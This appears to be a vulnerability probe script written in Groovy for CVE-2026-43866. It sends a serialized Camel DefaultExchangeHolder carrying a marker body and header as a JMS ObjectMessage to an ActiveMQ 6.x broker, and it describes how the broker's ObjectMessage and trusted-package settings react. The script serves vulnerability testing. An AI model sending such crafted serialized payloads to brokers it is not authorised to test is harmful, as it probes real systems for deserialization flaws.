// SendHolder4x.groovy — CVE-2026-43866 probe for Camel 4.x / jakarta (ActiveMQ 6.x).
//
// The 2.x SendHolder.groovy produces org.apache.camel.impl.DefaultExchangeHolder, which
// does NOT exist in Camel 4.x (moved to org.apache.camel.support.* in Camel 3.0) — so a
// 6.x broker throws a plain ClassNotFoundException before trustedPackages is even checked.
// This version produces org.apache.camel.support.DefaultExchangeHolder (the 4.x class the
// 6.x broker actually looks for) and sends it as a jakarta JMS ObjectMessage.
//
// Run OFF THE INSTALL'S CLASSPATH so every version matches the broker exactly:
//
//   AMQ=/Users/jgallimore/srv/apache-activemq-6.4.0-SNAPSHOT
//   sdk use java 21.0.8-tem
//   groovy -cp "$AMQ/lib/*:$AMQ/lib/camel/*:$AMQ/lib/optional/*" SendHolder4x.groovy
//     (add -Duser=admin -Dpass=admin if the broker requires auth)

import org.apache.activemq.ActiveMQConnectionFactory
import org.apache.camel.Exchange
import org.apache.camel.impl.DefaultCamelContext
import org.apache.camel.support.DefaultExchange
import org.apache.camel.support.DefaultExchangeHolder
import jakarta.jms.Session

def brokerUrl = System.getProperty('broker', 'tcp://localhost:61616')
def user  = System.getProperty('user')
def pass  = System.getProperty('pass')
def queue = System.getProperty('queue', 'cve.in')
def marker = "PWNED-BODY-4x-${System.currentTimeMillis()}".toString()

// 1) Build the 4.x attack payload: org.apache.camel.support.DefaultExchangeHolder,
//    carrying an attacker-controlled body + header. (Context is never started; it only
//    mints an Exchange to marshal.)
def camel = new DefaultCamelContext()
def ex = new DefaultExchange(camel)
ex.getIn().setBody(marker)
ex.getIn().setHeader('x-injected', 'attacker-value')
Serializable holder = DefaultExchangeHolder.marshal(ex)
println "payload class = ${holder.getClass().name}"   // org.apache.camel.support.DefaultExchangeHolder
println "attacker body = ${marker}"

// 2) Send as a jakarta JMS ObjectMessage. Sending serialises (unfiltered); the broker-side
//    ObjectMessage.getObject() on consume is where objectMessageEnabled + trustedPackages apply.
def cf = new ActiveMQConnectionFactory(brokerUrl)
def conn = (user != null) ? cf.createConnection(user, pass) : cf.createConnection()
conn.start()
def sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE)
sess.createProducer(sess.createQueue(queue)).send(sess.createObjectMessage(holder))
conn.close()

println ""
println "sent ObjectMessage(support.DefaultExchangeHolder) -> queue://${queue} @ ${brokerUrl}"
println ""
println "Watch the broker log:"
println "  * objectMessageEnabled=false (default) -> IllegalStateException: JMS ObjectMessage is disabled"
println "  * objectMessageEnabled=true, default trust -> Forbidden class org.apache.camel.support.DefaultExchangeHolder"
println "  * objectMessageEnabled=true + trust org.apache.camel -> received logs Body: ${marker} (holder unmarshalled)"
